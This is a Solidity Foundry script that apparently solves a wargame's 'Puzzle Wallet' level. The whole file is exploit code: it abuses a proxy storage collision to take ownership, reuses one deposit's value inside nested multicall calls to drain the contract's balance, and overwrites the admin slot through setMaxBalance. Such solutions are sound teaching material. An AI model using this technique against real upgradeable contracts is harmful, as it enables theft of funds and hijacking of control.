// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {IPuzzleProxy, IPuzzleWallet} from "../src/Puzzle.sol";

contract SolvePuzzle is Script {
    IPuzzleProxy public proxy;
    IPuzzleWallet public wallet;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address proxyAddress = vm.envAddress("PUZZLE_ADDRESS");
        proxy = IPuzzleProxy(payable(proxyAddress));
        wallet = IPuzzleWallet(payable(proxyAddress));
        proxy.proposeNewAdmin(msg.sender);

        wallet.addToWhitelist(msg.sender);

        uint256 contractBalance = address(wallet).balance;

        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        multicallData[1] = abi.encodeWithSelector(wallet.multicall.selector, depositData);

        wallet.multicall{value: contractBalance}(multicallData);
        wallet.execute(msg.sender, contractBalance * 2, "");

        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        vm.stopBroadcast();
    }
}
